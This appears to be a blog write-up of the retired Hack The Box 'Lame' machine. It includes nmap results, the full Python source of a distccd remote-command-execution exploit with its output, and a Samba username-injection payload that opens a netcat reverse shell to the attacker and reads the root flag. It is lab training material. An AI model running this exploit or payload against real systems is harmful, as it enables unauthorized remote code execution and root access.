---
title: "Lame - HackTheBox"
date: 2022-04-09
draft: false
tags: ["CVE","SMB", "FTP", "TJnull"]
categories: ["Hack The Box","TJnull",]
featuredImage: "Lame.webp"
summary: "Exploiting Lame in 3 methods without using Metasploit."
---

**Machine Link: https://app.hackthebox.com/machines/Lame/**

## init

This machine have many vulnerabilities but the easiest exploit is the SMB one.
First I tried to exploit `distccd` but we can't get root privilages. And I am not good at privilage escalation, I am ovewhelmed with the linpeas output.

## Reconnaissance

Commonly I use AutoRecon with double Verbosity.

here is the nmap output
```
# Nmap 7.92 scan initiated Fri Apr  8 11:48:32 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/rohit/htb/Lame/results/10.10.10.3/scans/_full_tcp_nmap.txt -oX /home/rohit/htb/Lame/results/10.10.10.3/scans/xml/_full_tcp_nmap.xml 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.41s latency).
Scanned at 2022-04-08 11:48:33 IST for 323s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.25.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (91%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (91%), Dell Integrated Remote Access Controller (iDRAC6) (91%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (91%), Linux 2.4.21 - 2.4.31 (likely embedded) (91%), Linux 2.4.27 (91%), Linux 2.6.22 (91%), Linux 2.6.8 - 2.6.30 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=4/8%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=624FD4FC%P=x86_64-pc-linux-gnu)
SEQ(SP=CF%GCD=1%ISR=D0%TI=Z%TS=7)
OPS(O1=M54BST11NW5%O2=M54BST11NW5%O3=M54BNNT11NW5%O4=M54BST11NW5%O5=M54BST11NW5%O6=M54BST11)
WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)
ECN(R=Y%DF=Y%TG=40%W=16D0%O=M54BNNSNW5%CC=N%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.178 days (since Fri Apr  8 07:37:43 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=202 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 26311/tcp): CLEAN (Timeout)
|   Check 3 (port 41283/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-04-08T02:23:46-04:00
|_clock-skew: mean: 2h00m29s, deviation: 2h49m46s, median: 26s
|_smb2-security-mode: Couldn't establish a SMBv2 connection.

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   514.71 ms 10.10.16.1
2   514.72 ms 10.10.10.3

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  8 11:53:56 2022 -- 1 IP address (1 host up) scanned in 323.25 seconds
```
nmap found 5 open ports.

nmap says port 21 is using `vsftpd 2.3.4`.

lets search that in exploitdb.
```
rohit@kali ~/htb/Lame/results/10.10.10.3/scans> searchsploit vsftpd 2.3.4
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                          | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)             | unix/remote/17491.rb
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
## exploiting FTP

lets make a local copy of the exploit.
```bash
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> searchsploit -m 49757
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
File Type: Python script, ASCII text executable

Copied to: /home/rohit/htb/Lame/results/10.10.10.3/exploit/49757.py
```
lets run the exploit

```
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> python3 49757.py 10.10.10.3
^C   [+]Exiting...
```
it didn't work, I think it is just a rabbithole.

then is searched for distccd 4.2.4 exploit in google. luckly i found one.

## distccd v1 RCE (CVE-2004-2687) 4.2.4

exploit link: https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855

exploit code:
```python
#!/usr/bin/python2

import socket
import string
import random
import argparse

def rand_text_alphanumeric(len):
	str = ""
	for i in range(len):
		str += random.choice(string.ascii_letters + string.digits)

	return str

def read_std(s):
	s.recv(4)
	len = int(s.recv(8), 16)
	if len != 0:
		return s.recv(len)

def exploit(command, host, port):
	args = ["sh", "-c", command, "#", "-c", "main.c", "-o", "main.o"]
	payload = "DIST00000001" + "ARGC%.8x" % len(args)

	for arg in args:
		payload += "ARGV%.8x%s" % (len(arg), arg)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	socket.setdefaulttimeout(5)
	s.settimeout(5)

	if s.connect_ex((host, port)) == 0:
		print("[\033[32mOK\033[39m] Connected to remote service")
		try:
			s.send(payload)
			dtag = "DOTI0000000A" + rand_text_alphanumeric(10)
			s.send(dtag)			
			s.recv(24)
			print("\n--- BEGIN BUFFER ---\n")
			buff = read_std(s)
			if buff:
				print(buff)
			buff = read_std(s)
			if buff:
				print(buff)
			print("\n--- END BUFFER ---\n")
			print("[\033[32mOK\033[39m] Done.")
		except socket.timeout:
			print("[\033[31mKO\033[39m] Socket Timeout")
		except socket.error:
			print("[\033[31mKO\033[39m] Socket Error")
		except Exception:
			print("[\033[31mKO\033[39m] Exception Raised")
		finally:
			s.close()		
	else:
		print("[\033[31mKO\033[39m] Failed to connect to %s on port %d" % (host, port))


parser = argparse.ArgumentParser(description='DistCC Daemon - Command Execution (Metasploit)')

parser.add_argument('-t', action="store", dest="host", required=True, help="Target IP/HOST")
parser.add_argument('-p', action="store", type=int, dest="port", default=3632, help="DistCCd listening port")
parser.add_argument('-c', action="store", dest="command", default="id", help="Command to run on target system")

try:
	argv = parser.parse_args()

	exploit(argv.command, argv.host, argv.port)
except IOError:
	parse.error
```

lets try the exploit.

```
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit [2]> python2 distccd_rce.py
usage: distccd_rce.py [-h] -t HOST [-p PORT] [-c COMMAND]
distccd_rce.py: error: the following arguments are required: -t
```
we need to pass ip, port and command.
```
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> python2 distccd_rce.py -t 10.10.10.3 -p 3632 -c "whoami"
[OK] Connected to remote service

--- BEGIN BUFFER ---

daemon


--- END BUFFER ---

[OK] Done.
```
😲 It works!.

lets get the flags.

```
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> python2 distccd_rce.py -t 10.10.10.3 -p 3632 -c "ls /home/"
[OK] Connected to remote service

--- BEGIN BUFFER ---

ftp
makis
service
user


--- END BUFFER ---

[OK] Done.
```
looks flag is in the makis user's folder.

```
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> python2 distccd_rce.py -t 10.10.10.3 -p 3632 -c "ls /home/makis"
[OK] Connected to remote service

--- BEGIN BUFFER ---

user.txt


--- END BUFFER ---

[OK] Done.
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> python2 distccd_rce.py -t 10.10.10.3 -p 3632 -c "cat /home/makis/user.txt"
[OK] Connected to remote service

--- BEGIN BUFFER ---

600ce1c9b1cae2896335c98be67f****


--- END BUFFER ---

[OK] Done.
```
lets find the root flag.
```
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> python2 distccd_rce.py -t 10.10.10.3 -p 3632 -c "ls /root/"
[OK] Connected to remote service

--- BEGIN BUFFER ---

Desktop
reset_logs.sh
root.txt
vnc.log


--- END BUFFER ---

[OK] Done.
rohit@kali ~/htb/Lame/results/10.10.10.3/exploit> python2 distccd_rce.py -t 10.10.10.3 -p 3632 -c "cat /root/root.txt"
[OK] Connected to remote service

--- BEGIN BUFFER ---

cat: /root/root.txt: Permission denied


--- END BUFFER ---

[OK] Done.
```
looks like we don't have permission to access the root flag.

I am not good at privilage escalation so just move on to the other services/ports.

## SMB: Samba Exploit

after searching samba version in the google i understood how this exploit works.

we can execute commands remotely by adding command backquotes in the username while authenticating.

Payload is
```bash
"./=`nohup nc -e /bin/sh {attacker_ip} {attacker_port}"
```

setup a netcat listener.

```bash
netcat -lvnp 4000
```

just hit `enter` if smb client prompts for password
```
rohit@kali ~> smbclient //10.10.10.3/tmp
Enter WORKGROUP\rohit's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>  logon "./=`nohup nc -e /bin/sh 10.10.25.14 4000`"
Password:
session setup failed: NT_STATUS_IO_TIMEOUT
smb: \>
```

in netcat listener

```
rohit@kali ~> nc -lvnp 4000
listening on [any] 4000 ...
connect to [10.10.25.14] from (UNKNOWN) [10.10.10.3] 47529
cat /root/root.txt
7af315a6ec5317365ad6759df434****
```

**by [@RohitKumarAnkam](https://rohitkumarankam.com)**